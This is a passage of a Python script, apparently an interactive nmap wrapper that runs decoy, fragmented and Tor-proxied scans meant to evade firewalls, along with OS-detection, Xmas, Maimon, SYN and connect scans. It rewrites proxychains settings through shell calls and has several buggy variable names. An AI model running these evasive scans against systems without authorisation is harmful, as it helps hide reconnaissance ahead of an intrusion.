                                         v=json.dumps(value,indent=4)
                                         print(key,"=>",v)
                                     nmap_decoy_1=input("Do you want to save it in a file then give a suitable name or simply you can leave it if you don't want( ◜ ‿ ◝ )♡:- ")
                                     nmap_decoy_save=directory+nmap_decoy_1+".json"
                                     if bool(nmap_decoy_1)==True:
                                        with open(nmap_decoy_save,"w") as save_file:
                                             inp=json.dumps(decoy_scan,indent=4)
                                             save_file.write(inp)
                                        total=50
                                        bar=ProgressBar(total,prefix='¦ ᴾأèᴧ᥉è 𝗯è ᴾᴧƚ¡ɇทcɇ ¦...',spinner_type='db')
                                        for gen in range(total):
                                            bar.iter()
                                            s(0.2)      
                                        print("")
                                        print(f"Your file is:- {nmap_decoy_save}")
                                        system("users|awk '{print $1}'>/usr/share/mona/user_name.txt")
                                        system(f"sudo -u $(cat /usr/share/mona/user_name.txt) dbus-launch gnome-terminal -q --command 'firefox {nmap_decoy_save}';rm -rf /usr/share/mona/user_name.txt")
                                        print("Hope you'll enjoy this output Maam...🥰") 
                                     else:
                                        print("Okkk Noouuu Problem Maam...( ｡•̀ ᴗ -)✧")        
                                else:
                                  decoy_scan
                             else:
                                ip_numbers=int(input("Maam you've to give the numbers of ip (⊃ ｡ •́ ‿ •̀ ｡ )⊃ :- ")) 
                                i=0
                                ip_list=[]       
                                while (i<ip_numbers):
                                      ipss_val=input(f"Take The ip for {i}:- ")
                                      ip_list.append(ipss_val)
                                      i+=1
                                if bool(multiple_ports)==False:
                                   scanning_text3="▄︻̷̿┻̿═━一ᵂᵃʳⁿⁱⁿᵍ❣︎⚟"
                                   for b in scanning_text3:
                                       print(b,end="",flush=True)
                                       s(0.2)
                                   print("")
                                   for ipss in ip_list:
                                        decoy_scan=nmap_scanner.scan(hosts=target_ip_addr,ports=port_4,arguments=f"-D {ipss} --mtu {mtu} -e {interface_val}")
                                else:
                                    scanning_text4=" ︻デ═一 𓂃 ֢֢֢ 😍"
                                    for b in scanning_text4:
                                        print(b,end="",flush=True)
                                        s(0.2)
                                    print("")
                                    for ipss in ip_list:
                                        decoy_scan=nmap_scanner.scan(hosts=target_ip_addr,ports=f"{port_4}-{multiple_ports}",arguments=f"-D {ipss} --mtu {mtu} -e {interface_val}")
                                def downhost(decoy_scan):
                                    for key,value in decoy_scan.items():
                                        if key=='nmap':
                                           key=value['scanstats']
                                           for key,value in key.items():
                                               if key=='downhosts':
                                                  return value
                                host_down=downhost(decoy_scan)
                                if host_down=='1':
                                  for key,value in decoy_scan['nmap'].items():
                                      v=json.dumps(value,indent=4)
                                      print(key,"=>",v)
                                elif host_down=='0':
                                     for key,value in decoy_scan['scan'].items():
                                         v=json.dumps(value,indent=4)
                                         print(key,"=>",v)
                                     nmap_decoy_1=input("Do you want to save it in a file then give a suitable name or simply you can leave it if you don't want( ◜ ‿ ◝ )♡:- ")
                                     nmap_decoy_save=directory+nmap_decoy_1+".json"
                                     if bool(nmap_decoy_1)==True:
                                        with open(nmap_decoy_save,"w") as save_file:
                                             inp=json.dumps(decoy_scan,indent=4)
                                             save_file.write(inp)
                                        total=50
                                        bar=ProgressBar(total,prefix='¦ ᴾأèᴧ᥉è 𝗯è ᴾᴧƚ¡ɇทcɇ ¦...',spinner_type='db')
                                        for gen in range(total):
                                            bar.iter()
                                            s(0.2)      
                                        print("")
                                        print(f"Your file is:- {nmap_decoy_save}")
                                        system("users|awk '{print $1}'>/usr/share/mona/user_name.txt")
                                        system(f"sudo -u $(cat /usr/share/mona/user_name.txt) dbus-launch gnome-terminal -q --command 'firefox {nmap_decoy_save}';rm -rf /usr/share/mona/user_name.txt")
                                        print("Hope you'll enjoy this output Maam...🥰") 
                                     else:
                                        print("Okkk Noouuu Problem Maam...( ｡•̀ ᴗ - )✧")        
                                else:
                                  decoy_scan
                         if bool(fragments_pkts)==True:
                            mtu_int=int(fragments_pkts)
                            D.decoy_design()
                            print("")
                            cloak_attack(mtu_int,multiple_ports=port_2,port_4=port_1)if bool(port_2)==True else cloak_attack(mtu_int,port_4=port_1)
                         else:
                            D.decoy_design()
                            print("")
                            cloak_attack(multiple_ports=port_2,port_4=port_1)if bool(port_2)==True else cloak_attack(port_4=port_1)   
                    elif firewall_attack==3:
                          def proxy_attack(mtu='1400',multiple_ports='',port_5=''):
                              print("Maam in this attack you have to need to set your proxychains in Socks4/Socks5 and start the service of tor...(✿˶’◡˘)♡")
                              confirm=input("Have you Configured your file Maam[y/n]:- ")
                              if confirm=='y':  
                                 pass
                              else:
                                 print("Okk Don't Worry Maam i am configuering it if any error has occured then please check it manually...( ꈍᴗ ꈍ)")
                                 distribution=distro.os_release_info()
                                 distro_name=distribution['id_like']
                                 if distro_name=='debian':
                                    system("apt-get install tor proxychains -y;systemctl start tor;sed -i '10s/^#//' /etc/proxychains.conf;sed -i '51s/^#//' /etc/proxychains.conf;sed -i '53s/^#//' /etc/proxychains.conf;sed -i '18s/^/#/' /etc/proxychains.conf")
                                 elif distro_name=='arch':
                                      system("pacman -S proxychains --noconfirm;systemctl start tor;sed -i '10s/^#//' /etc/proxychains.conf;sed -i '147s/^#//' /etc/proxychains.conf;sed -i '149s/^#//' /etc/proxychains.conf;sed -i '18s/^/#/' /etc/proxychains.conf")
                              if bool(multiple_ports)==False:
                                 scanning_text6="(☉｡☉)!→Ａ☥ʈᵅcʞē𝐫 ᴍ٥𝕕ᶓ Ō𝙣🔥"
                                 for b in scanning_text6:
                                     print(b,end="",flush=True)
                                     s(0.2)
                                 print("")
                                 system(f"proxychains nmap -e {interface_val} --mtu {mtu} -Pn -p {port_5} {target_ip_addr} -v --packet-trace")
                              else:
                                 scanning_text6="( う-´)づ︻╦̵̵̿╤── \(˚〇˚'')/ "
                                 for b in scanning_text7:
                                     print(b,end="",flush=True)
                                     s(0.2)
                                     print("")
                                 system(f"proxychains nmap -e {interface_val} --mtu {mtu} -Pn  -p {port_5}-{multiple_ports} {target_ip_addr} -v --packet-trace")
                          if bool(fragments_pkts)==True:
                             mtu_int=int(fragments_pkts)
                             D.proxy_design()
                             print("")
                             proxy_attack(mtu_int,multiple_ports=port_2,port_5=port_1)if bool(port_2)==True else proxy_attack(mtu_int,port_5=port_1)
                          else:
                            D.proxy_design()
                            print("")
                            proxy_attack(multiple_ports=port_2,port_5=port_1)if bool(port_2)==True else proxy_attack(port_5=port_1)   
                    else:
                       print("Sorry Maam You've Choosen Wrong input...")               
                 elif attack_mode==2:
                      D.osscan()
                      print("")
                      print("Okk Now you've choosen mee....🤗")
                      D.osscan_attack_mode()
                      print("")
                      osscan_attack=int(input("Which do you want to prefer maam ヘ(^_^ヘ):-  "))
                      if osscan_attack==1:
                         D.brutal_design()
                         print("")
                         def aggressive_mode(multiple_ports='',port_6=''):
                             brutal_attack={}
                             if bool(multiple_ports)==False:
                                scanning_text7=".˳⁺⁎˚ ︻デ═一 ♡ ~ .˳⁺⁎˚"
                                for b in scanning_text7:
                                    print(b,end="",flush=True)
                                    s(0.2)
                                    print("")
                                brutal_attack=nmap_scanner.scan(hosts=target_ip_addr,ports={port_6},arguments=f"--osscan-guess -vv -e {interface_val}")
                             else:
                                scanning_text8="(҂⋋⁔⋌)==≡눈-"
                                for b in scanning_text8:
                                    print(b,end="",flush=True)
                                    s(0.2)
                                    print("")
                                brutal_attack=nmap_scanner.scan(hosts=target_ip_addr,ports=f"{port_6}-{multiple_ports}",arguments=f"--osscan-guess -vv -e {interface_val}")
                             def downhost(brutal_attack):
                                    for key,value in brutal_attack.items():
                                        if key=='nmap':
                                           key=value['scanstats']
                                           for key,value in key.items():
                                               if key=='downhosts':
                                                  return value
                             host_down=downhost(brutal_attack)
                             if host_down=='1':
                                for key,value in brutal_attack['nmap'].items():
                                    v=json.dumps(value,indent=4)
                                    print(key,"=>",v)
                             elif host_down=='0':
                                  for key,value in brutal_attack['scan'].items():
                                      v=json.dumps(value,indent=4)
                                      print(key,"=>",v)
                                      nmap_brutal_1=input("Do you want to save it in a file then give a suitable name or simply you can leave it if you don't want( ◜ ‿ ◝ )♡:- ")
                                      nmap_brutal_save=directory+nmap_brutal_1+".json"
                                      if bool(nmap_brutal_1)==True:
                                         with open(nmap_brutal_save,"w") as save_file:
                                              inp=json.dumps(brutal_attack,indent=4)
                                              save_file.write(inp)
                                         total=50
                                         bar=progressbar.ProgressBar(maxval=100,widgets=["♡˚𝙴กէē𝔯ĺกℊ Ɏόᶹ𝖗 𝔉༏𝗅ē˚♡ ",progressbar.Bar(marker="#",left=' [',right=']'),progressbar.FileTransferSpeed(),' (',progressbar.ETA(),') ']).start()
                                         for i in range(100):
                                             bar.update(i)
                                             s(0.1)
                                         print("")
                                         print(f"Your file is:- {nmap_brutal_save}")
                                         system("users|awk '{print $1}'>/usr/share/mona/user_name.txt")
                                         system(f"sudo -u $(cat /usr/share/mona/user_name.txt) dbus-launch gnome-terminal -q --command 'firefox {nmap_brutal_save}';rm -rf /usr/share/mona/user_name.txt")
                                         print("Hope you'll enjoy this output Maam...🥰") 
                                      else:
                                        print("Okkk Noouuu Problem Maam...( ｡•̀ ᴗ -)✧")        
                             else:
                                brutal_attack
                         aggressive_mode(multiple_ports=port_2,port_6=port_1)if bool(port_2)==True else aggressive_mode(port_6=port_1)    
                      elif osscan_attack==2:
                           D.limit_design()
                           print("")
                           def normal_mode(multiple_ports='',port_6=''):
                               normal_attack={}
                               if bool(multiple_ports)==False:
                                  scanning_text7="(●_-)–ε/̵͇̿/’̿’̿ ̿ ̿ ̿ 💥｀、ヽ｀ヽ｀、ヽ⚰️"
                                  for b in scanning_text7:
                                      print(b,end="",flush=True)
                                      s(0.2)
                                  print("")
                                  normal_attack=nmap_scanner.scan(hosts=target_ip_addr,ports=port_6,arguments=f"-O -vv -e {interface_val}")
                               else:
                                  scanning_text8="𒋘’̿ ̿ ̿ ̿ ̿・ﾟ。.:˗ˏˋ❤️ˎˊ˗:"
                                  for b in scanning_text8:
                                      print(b,end="",flush=True)
                                      s(0.2)
                                  print("")
                                  normal_attack=nmap_scanner.scan(hosts=target_ip_addr,ports=f"{port_6}-{multiple_ports}",arguments=f"-O -vv -e {interface_val}")
                               def downhost(normal_attack):
                                    for key,value in normal_attack.items():
                                        if key=='nmap':
                                           key=value['scanstats']
                                           for key,value in key.items():
                                               if key=='downhosts':
                                                  return value
                               host_down=downhost(normal_attack)
                               if host_down=='1':
                                  for key,value in nomal_attack['nmap'].items():
                                      v=json.dumps(value,indent=4)
                                      print(key,"=>",v)
                               elif host_down=='0':
                                    for key,value in normal_attack['scan'].items():
                                        v=json.dumps(value,indent=4)
                                        print(key,"=>",v)
                                    nmap_normal_1=input("Do you want to save it in a file then give a suitable name or simply you can leave it if you don't want( ◜ ‿ ◝ )♡:- ")
                                    nmap_normal_save=directory+nmap_normal_1+".json"
                                    if bool(nmap_normal_1)==True:
                                        with open(nmap_normal_save,"w") as save_file:
                                            inp=json.dumps(normal_attack,indent=4)
                                            save_file.write(inp)
                                        total=50
                                        bar=progressbar.ProgressBar(maxval=100,widgets=["( ͡🌀 ͜ʖ ͡🌀)つ━━━☆ﾟ.*･｡ﾟ ",progressbar.BouncingBar(marker="✰",left=' [',right=']'),progressbar.FileTransferSpeed(),' (',progressbar.ETA(),') ']).start()
                                        for i in range(100):
                                            bar.update(i)
                                            s(0.1)
                                        print("")
                                        print(f"Your file is:- {nmap_normal_save}")
                                        system("users|awk '{print $1}'>/usr/share/mona/user_name.txt")
                                        system(f"sudo -u $(cat /usr/share/mona/user_name.txt) dbus-launch gnome-terminal -q --command 'firefox {nmap_brutal_save}';rm -rf /usr/share/mona/user_name.txt")
                                        print("Hope you'll enjoy this output Maam...🥰") 
                                        print("Hope you'll enjoy this output Maam...🥰") 
                                    else:
                                       print("Okkk Noouuu Problem Maam...( ｡•̀ ᴗ -)✧")        
                               else:
                                  normal_attack
                           normal_mode(multiple_ports=port_2,port_6=port_1)if bool(port_2)==True else normal_mode(port_6=port_1)   
                      else:
                        D.limit2_design()
                        print("")
                        def topical_mode(multiple_ports='',port_6=''):
                            topical_attack={}
                            if bool(multiple_ports)==False:
                                scanning_text7="( ͡🌀 ͜ʖ ͡🌀)つ━━━☆ﾟ.*･｡ﾟ ✰ ✰ ✰ ✰"
                                for b in scanning_text7:
                                    print(b,end="",flush=True)
                                    s(0.2)
                                print("")
                                topical_attack=nmap_scanner.scan(hosts=target_ip_addr,ports=port_6,arguments=f"--osscan-limit -vv -e {interface_val}")
                            else:
                                scanning_text8="  ̿ ̿ ̿ ̿ ̿ ̿\̵͇̿̿\з=(◣_◢)=ε/̵͇̿̿/’̿̿ ̿ ̿ ̿ ̿ ̿ "
                                for b in scanning_text8:
                                    print(b,end="",flush=True)
                                    s(0.2)
                                print("")
                                topical_attack=nmap_scanner.scan(hosts=target_ip_addr,ports=f"{port_6}-{multiple_ports}",arguments=f"--osscan-limit -vv -e {interface_val}")
                            def downhost(topical_attack):
                                for key,value in topical_attack.items():
                                    if key=='nmap':
                                        key=value['scanstats']
                                        for key,value in key.items():
                                            if key=='downhosts':
                                                return value
                            host_down=downhost(topical_attack)
                            if host_down=='1':
                                for key,value in topical_attack['nmap'].items():
                                    v=json.dumps(value,indent=4)
                                    print(key,"=>",v)
                            elif host_down=='0':
                                  for key,value in topical_attack['scan'].items():
                                      v=json.dumps(value,indent=4)
                                      print(key,"=>",v)
                                      nmap_topical_1=input("Do you want to save it in a file then give a suitable name or simply you can leave it if you don't want( ◜ ‿ ◝ )♡:- ")
                                      nmap_topical_save=directory+nmap_topical_1+".json"
                                      if bool(nmap_topical_1)==True:
                                         with open(nmap_topical_save,"w") as save_file:
                                              inp=json.dumps(topical_attack,indent=4)
                                              save_file.write(inp)
                                         total=50
                                         bar=progressbar.ProgressBar(maxval=100,widgets=["\━ 𝑮ϵɳϵ𝖗𝒶ₜịꫛ𝖌 ÿ𝓸ù𝖗 𝐅𝚒ᥣ𝑒 :･ﾟ✧/ ",progressbar.BouncingBar(marker="#",left=' [',right=']'),progressbar.FileTransferSpeed(),' (',progressbar.ETA(),') ']).start()
                                         for i in range(100):
                                             bar.update(i)
                                             s(0.1)
                                         print("")
                                         print(f"Your file is:- {nmap_topical_save}")
                                         system("users|awk '{print $1}'>/usr/share/mona/user_name.txt")
                                         system(f"sudo -u $(cat /usr/share/mona/user_name.txt) dbus-launch gnome-terminal -q --command 'firefox {nmap_topical_save}';rm -rf /usr/share/mona/user_name.txt")
                                         print("Hope you'll enjoy this output Maam...🥰") 
                                         print("Hope you'll enjoy this output Maam...🥰") 
                                      else:
                                        print("Okkk Noouuu Problem Maam...( ｡•̀ ᴗ -)✧")        
                            else:
                                normal_attack
                        topical_mode(multiple_ports=port_2,port_6=port_1)if bool(port_2)==True else topical_mode(port_6=port_1) 
                 else:
                    D.scan_design()
                    print("") 
                    print("Welcome to Scanning Attack..😎")
                    D.scan_attack_mode()
                    scan_attack_type=int(input("Maam from here which scan do you want to choose:- "))
                    if scan_attack_type==1:
                        D.maimon_design()
                        print("")
                        def maimon_scan_attack(multiple_ports='',main_port=''):
                            maimon_scan={}
                            if bool(multiple_ports)==False:
                               scanning_text9="༼ ºل͟º ༽ ̿ ̿ ̿ ̿’̿’̵з=༼ ▀̿Ĺ̯▀̿ ̿ ༽"
                               for scan in scanning_text9:
                                   print(scan,end="",flush=True)
                                   s(0.1)
                               print("") 
                               maimon_scan=nmap_scanner.scan(hosts=target_ip_addr,ports=main_port,arguments=f"-sM -sV -e {interface_val}")
                            else:
                                scanning_text10="( φ_<)r┬ ━━━━━━…=> - - - -ᵝǿǿǿ𝚘ₒ𐌼"
                                for scan in scanning_text10:
                                    print(scan,end="",flush=True)
                                    s(0.1)
                                print("")
                                maimon_scan=nmap_scanner.scan(hosts=target_ip_addr,ports=f"{main_port}-{multiple_ports}",arguments=f"-sM -sV -e {interface_val}")
                            downhost=maimon_scan['nmap']['scanstats']['downhosts']
                            print("<<--------------乂 Ścₐꪦ ꭱɇᎦůḽ𝘵 乂----------------->>")
                            print("Scan Time => ",maimon_scan['nmap']['scanstats']['timestr'])
                            if downhost=='0':
                               addr=nmap_scanner.all_hosts()
                               print("Target IP => ",addr[0])
                               def mac_address(addr):
                                   for key,value in maimon_scan['scan'][addr]['addresses'].items():
                                       if key=='mac':
                                          return value
                               mac_value=mac_address(addr[0])
                               print("Target Mac => ",mac_value)
                               if  bool(maimon_scan['scan'][addr[0]]['vendor'])==True:
                                   print("Vendor => ",maimon_scan['scan'][addr[0]]['vendor'][mac_value])
                               print("State => ",maimon_scan['scan'][addr[0]]['status']['state'])
                               print("Reason => ",maimon_scan['scan'][addr[0]]['status']['reason'])
                               print("Uphost => ",maimon_scan['nmap']['scanstats']['uphosts'])
                               print("Downhost => ",maimon_scan['nmap']['scanstats']['downhosts'])
                               print("Elapsed => ",maimon_scan['nmap']['scanstats']['elapsed'])
                               print("Method => ",maimon_scan['nmap']['scaninfo']['tcp']['method'])
                               print("<<--------------︻╦̵̵͇╤─ - ⪼ㅤ₱ØⱤ₮ ⱤɆ₴ɄⱠ₮ ⪻ - ─╤̵̵͇╦︻------------->>")
                               if bool(port_2)==True:
                                  for i in range(int(port_1),(int(port_2)+1)):
                                      for key,value in maimon_scan['scan'][addr[0]]['tcp'][i].items():
                                          print("Port No. => ",i)
                                          print("Port Name => ",maimon_scan['scan'][addr[0]]['tcp'][i]['name'])
                                          print("State => ",maimon_scan['scan'][addr[0]]['tcp'][i]['state'])
                                          print("Reason => ",maimon_scan['scan'][addr[0]]['tcp'][i]['reason'])
                                          print("Product => ",maimon_scan['scan'][addr[0]]['tcp'][i]['product'])
                                          print("Version info => ",maimon_scan['scan'][addr[0]]['tcp'][i]['version'])
                                          print("Conf => ",maimon_scan['scan'][addr[0]]['tcp'][i]['conf'])
                                          print("Cpe => ",maimon_scan['scan'][addr[0]]['tcp'][i]['cpe'])
                                          print("X---------------🚫---------------X")
                                          break
                               else:
                                  for key,value in maimon_scan['scan'][addr[0]]['tcp'][int(port_1)].items():
                                      print("Port No. => ",int(port_1))
                                      print("Port Name => ",maimon_scan['scan'][addr[0]]['tcp'][int(port_1)]['name'])
                                      print("State => ",maimon_scan['scan'][addr[0]]['tcp'][int(port_1)]['state'])
                                      print("Reason => ",maimon_scan['scan'][addr[0]]['tcp'][int(port_1)]['reason'])
                                      print("Product => ",maimon_scan['scan'][addr[0]]['tcp'][int(port_1)]['product'])
                                      print("Version info => ",maimon_scan['scan'][addr[0]]['tcp'][int(port_1)]['version'])
                                      print("Conf => ",maimon_scan['scan'][addr[0]]['tcp'][int(port_1)]['conf'])
                                      print("Cpe => ",maimon_scan['scan'][addr[0]]['tcp'][int(port_1)]['cpe'])
                                      print("X--------------🚫--------------X")
                                      break
                            else:
                                print("Uphost => ",maimon_scan['nmap']['scanstats']['uphosts'])
                                print("Downhost => ",maimon_scan['nmap']['scanstats']['downhosts'])
                                print("Elapsed => ",maimon_scan['nmap']['scanstats']['elapsed'])
                                print("Sorry Maam it seems that your host is down...😟")
                        maimon_scan_attack(multiple_ports=port_2,main_port=port_1)if bool(port_2)==True else maimon_scan_attack(main_port=port_1)
                    elif scan_attack_type==3:
                         D.xmas_design()
                         print("")
                         def xmas_scan_attack(multiple_ports='',main_port=''):
                             xmas_scan={}
                             if bool(multiple_ports)==False:
                                scanning_text11="▄︻┻═┳一꧁  𓊈𒆜 Fire𒆜 𓊉꧂"
                                for scan in scanning_text11:
                                    print(scan,end="",flush=True)
                                    s(0.1)
                                print("") 
                                xmas_scan=nmap_scanner.scan(hosts=target_ip_addr,ports=main_port,arguments=f"-sX -sV -e {interface_val}")
                             else:
                                scanning_text12="  ̿ ̿=‘̿’\̵͇̿ Ɛ=(º͡ ʖ͜ º͡ )Ḅꪋп𝔡𝒐𝐨к 𝐦ɇṛī ᥣꪋīᥣꪋ( ͡º ͜ʖ ͡º)=ε/̵͇̿/'̿'̿ ̿  "
                                for scan in scanning_text12:
                                    print(scan,end="",flush=True)
                                    s(0.1)
                                print("")
                                xmas_scan=nmap_scanner.scan(hosts=target_ip_addr,ports=f"{main_port}-{multiple_ports}",arguments=f"-sX -sV -e {interface_val}")
                             downhost=xmas_scan['nmap']['scanstats']['downhosts']
                             print("<<--------------乂 Ścₐꪦ ꭱɇᎦůḽ𝘵 乂----------------->>")
                             print("Scan Time => ",xmas_scan['nmap']['scanstats']['timestr'])
                             if downhost=='0':
                                addr=nmap_scanner.all_hosts()
                                print("Target IP => ",addr[0])
                                def mac_address(addr):
                                    for key,value in xmas_scan['scan'][addr]['addresses'].items():
                                        if key=='mac':
                                           return value
                                mac_value=mac_address(addr[0])
                                print("Target Mac => ",mac_value)
                                if  bool(xmas_scan['scan'][addr[0]]['vendor'])==True:
                                    print("Vendor => ",xmas_scan['scan'][addr[0]]['vendor'][mac_value])
                                print("State => ",xmas_scan['scan'][addr[0]]['status']['state'])
                                print("Reason => ",xmas_scan['scan'][addr[0]]['status']['reason'])
                                print("Uphost => ",xmas_scan['nmap']['scanstats']['uphosts'])
                                print("Downhost => ",xmas_scan['nmap']['scanstats']['downhosts'])
                                print("Elapsed => ",xmas_scan['nmap']['scanstats']['elapsed'])
                                print("Method => ",xmas_scan['nmap']['scaninfo']['tcp']['method'])
                                print("<<--------------︻╦̵̵͇╤─ - ⪼ㅤ₱ØⱤ₮ ⱤɆ₴ɄⱠ₮ ⪻ - ─╤̵̵͇╦︻------------->>")
                                if bool(port_2)==True:
                                   for i in range(int(port_1),(int(port_2)+1)):
                                       for key,value in xmas_scan['scan'][addr[0]]['tcp'][i].items():
                                           print("Port No. => ",i)
                                           print("Port Name => ",xmas_scan['scan'][addr[0]]['tcp'][i]['name'])
                                           print("State => ",xmas_scan['scan'][addr[0]]['tcp'][i]['state'])
                                           print("Reason => ",xmas_scan['scan'][addr[0]]['tcp'][i]['reason'])
                                           print("Product => ",xmas_scan['scan'][addr[0]]['tcp'][i]['product'])
                                           print("Version info => ",xmas_scan['scan'][addr[0]]['tcp'][i]['version'])
                                           print("Conf => ",xmas_scan['scan'][addr[0]]['tcp'][i]['conf'])
                                           print("Cpe => ",xmas_scan['scan'][addr[0]]['tcp'][i]['cpe'])
                                           print("X---------------🚫---------------X")
                                           break
                                else:
                                  for key,value in xmas_scan['scan'][addr[0]]['tcp'][int(port_1)].items():
                                      print("Port No. => ",int(port_1))
                                      print("Port Name => ",xmas_scan['scan'][addr[0]]['tcp'][int(port_1)]['name'])
                                      print("State => ",xmas_scan['scan'][addr[0]]['tcp'][int(port_1)]['state'])
                                      print("Reason => ",xmas_scan['scan'][addr[0]]['tcp'][int(port_1)]['reason'])
                                      print("Product => ",xmas_scan['scan'][addr[0]]['tcp'][int(port_1)]['product'])
                                      print("Version info => ",xmas_scan['scan'][addr[0]]['tcp'][int(port_1)]['version'])
                                      print("Conf => ",xmas_scan['scan'][addr[0]]['tcp'][int(port_1)]['conf'])
                                      print("Cpe => ",xmas_scan['scan'][addr[0]]['tcp'][int(port_1)]['cpe'])
                                      print("X--------------🚫--------------X")
                                      break
                             else:
                                print("Uphost => ",xmas_scan['nmap']['scanstats']['uphosts'])
                                print("Downhost => ",xmas_scan['nmap']['scanstats']['downhosts'])
                                print("Elapsed => ",xmas_scan['nmap']['scanstats']['elapsed'])
                                print("Sorry Maam it seems that your host is down...😟")
                         xmas_scan_attack(multiple_ports=port_2,main_port=port_1)if bool(port_2)==True else xmas_scan_attack(main_port=port_1)    
                    elif scan_attack_type==2:
                         D.service_design()
                         print("")
                         service_tree=Tree()
                         service_tree.create_node("Service Detection Mode","service")
                         service_tree.create_node("TCP Full Mode","full",parent="service")
                         service_tree.create_node("TCP Half Mode","half",parent="service")
                         service_tree.create_node("UDP Mode","udp",parent="service")
                         print("")
                         print(service_tree)
                         service_mode=int(input("Which Mode do you wanna prefer Maam...ಡ  ͜ ʖ ಡ :- "))
                         if service_mode==1:
                             def tcp_scan_full(multiple_ports='',main_port=''):
                                 tcp_full_scan={}
                                 if bool(multiple_ports)==False:
                                    scanning_text13="︻デ═一 - - - - —͟͞͞★ Â𝘁𝘁ⱥcķ ᙢ𐍈ᖙɇ 𐍈ₙ ★"
                                    for scan in scanning_text13:
                                        print(scan,end="",flush=True)
                                        s(0.1)
                                    print("") 
                                    tcp_full_scan=nmap_scanner.scan(hosts=target_ip_addr,ports=main_port,arguments=f"-sT -sV -e {interface_val}")
                                 else:
                                    scanning_text14=" (⌐■_■)--︻╦╤─ ➳ ♡ ➳ ♡ ➳ ♡ ¯ツ "
                                    for scan in scanning_text14:
                                        print(scan,end="",flush=True)
                                        s(0.1)
                                    print("")
                                    tcp_full_scan=nmap_scanner.scan(hosts=target_ip_addr,ports=f"{main_port}-{multiple_ports}",arguments=f"-sT -sV -e {interface_val}")
                                 downhost=tcp_full_scan['nmap']['scanstats']['downhosts']
                                 print("<<--------------乂 Ścₐꪦ ꭱɇᎦůḽ𝘵 乂----------------->>")
                                 print("Scan Time => ",tcp_full_scan['nmap']['scanstats']['timestr'])
                                 if downhost=='0':
                                    addr=nmap_scanner.all_hosts()
                                    print("Target IP => ",addr[0])
                                    def mac_address(addr):
                                        for key,value in tcp_full_scan['scan'][addr]['addresses'].items():
                                            if key=='mac':
                                               return value
                                    mac_value=mac_address(addr[0])
                                    print("Target Mac => ",mac_value)
                                    if  bool(tcp_full_scan['scan'][addr[0]]['vendor'])==True:
                                        print("Vendor => ",tcp_full_scan['scan'][addr[0]]['vendor'][mac_value])
                                    print("State => ",tcp_full_scan['scan'][addr[0]]['status']['state'])
                                    print("Reason => ",tcp_full_scan['scan'][addr[0]]['status']['reason'])
                                    print("Uphost => ",tcp_full_scan['nmap']['scanstats']['uphosts'])
                                    print("Downhost => ",tcp_full_scan['nmap']['scanstats']['downhosts'])
                                    print("Elapsed => ",tcp_full_scan['nmap']['scanstats']['elapsed'])
                                    print("Method => ",tcp_full_scan['nmap']['scaninfo']['tcp']['method'])
                                    print("<<--------------︻╦̵̵͇╤─ - ⪼ㅤ₱ØⱤ₮ ⱤɆ₴ɄⱠ₮ ⪻ - ─╤̵̵͇╦︻------------->>")
                                    if bool(port_2)==True:
                                       for i in range(int(port_1),(int(port_2)+1)):
                                           for key,value in tcp_full_scan['scan'][addr[0]]['tcp'][i].items():
                                               print("Port No. => ",i)
                                               print("Port Name => ",tcp_full_scan['scan'][addr[0]]['tcp'][i]['name'])
                                               print("State => ",tcp_full_scan['scan'][addr[0]]['tcp'][i]['state'])
                                               print("Reason => ",tcp_full_scan['scan'][addr[0]]['tcp'][i]['reason'])
                                               print("Product => ",tcp_full_scan['scan'][addr[0]]['tcp'][i]['product'])
                                               print("Version info => ",tcp_full_scan['scan'][addr[0]]['tcp'][i]['version'])
                                               print("Conf => ",tcp_full_scan['scan'][addr[0]]['tcp'][i]['conf'])
                                               print("Cpe => ",tcp_full_scan['scan'][addr[0]]['tcp'][i]['cpe'])
                                               print("X---------------🚫---------------X")
                                               break
                                    else:
                                      for key,value in tcp_full_scan['scan'][addr[0]]['tcp'][int(port_1)].items():
                                          print("Port No. => ",int(port_1))
                                          print("Port Name => ",tcp_full_scan['scan'][addr[0]]['tcp'][int(port_1)]['name'])
                                          print("State => ",tcp_full_scan['scan'][addr[0]]['tcp'][int(port_1)]['state'])
                                          print("Reason => ",tcp_full_scan['scan'][addr[0]]['tcp'][int(port_1)]['reason'])
                                          print("Product => ",tcp_full_scan['scan'][addr[0]]['tcp'][int(port_1)]['product'])
                                          print("Version info => ",tcp_full_scan['scan'][addr[0]]['tcp'][int(port_1)]['version'])
                                          print("Conf => ",tcp_full_scan['scan'][addr[0]]['tcp'][int(port_1)]['conf'])
                                          print("Cpe => ",tcp_full_scan['scan'][addr[0]]['tcp'][int(port_1)]['cpe'])
                                          print("X--------------🚫--------------X")
                                          break
                                 else:
                                   print("Uphost => ",tcp_full_scan['nmap']['scanstats']['uphosts'])
                                   print("Downhost => ",tcp_full_scan['nmap']['scanstats']['downhosts'])
                                   print("Elapsed => ",tcp_full_scan['nmap']['scanstats']['elapsed'])
                                   print("Sorry Maam it seems that your host is down...😟")
                             tcp_scan_full(multiple_ports=port_2,main_port=port_1)if bool(port_2)==True else tcp_scan_full(main_port=port_1)
                         elif service_mode==2:
                            def tcp_scan_half(multiple_ports='',main_port=''):
                                 tcp_half_scan={}
                                 if bool(multiple_ports)==False:
                                    scanning_text13="(っ ‘o’)ﾉ⌒ ~ ː̗̤̣̀̈̇ː̖́.•"
                                    for scan in scanning_text13:
                                        print(scan,end="",flush=True)
                                        s(0.1)
                                    print("") 
                                    tcp_half_scan=nmap_scanner.scan(hosts=target_ip_addr,ports=main_port,arguments=f"-sS -sV -e {interface_val}")
                                 else:
                                    scanning_text14=" ╰༼.◕ ヮ◕.༽つ¤=[]———— (˚▽˚’!)/ "
                                    for scan in scanning_text14:
                                        print(scan,end="",flush=True)
                                        s(0.1)
                                    print("")
                                    tcp_half_scan=nmap_scanner.scan(hosts=target_ip_addr,ports=f"{main_port}-{multiple_ports}",arguments=f"-sS -sV -e {interface_val}")
                                 downhost=tcp_half_scan['nmap']['scanstats']['downhosts']
                                 print("<<--------------乂 Ścₐꪦ ꭱɇᎦůḽ𝘵 乂----------------->>")
                                 print("Scan Time => ",tcp_half_scan['nmap']['scanstats']['timestr'])
                                 if downhost=='0':
                                    addr=nmap_scanner.all_hosts()
                                    print("Target IP => ",addr[0])
                                    def mac_address(addr):
                                        for key,value in tcp_half_scan['scan'][addr]['addresses'].items():
                                            if key=='mac':
                                               return value
                                    mac_value=mac_address(addr[0])
                                    print("Target Mac => ",mac_value)
                                    if  bool(tcp_half_scan['scan'][addr[0]]['vendor'])==True:
                                       print("Vendor => ",tcp_half_scan['scan'][addr[0]]['vendor'][mac_value])
                                    print("State => ",tcp_half_scan['scan'][addr[0]]['status']['state'])
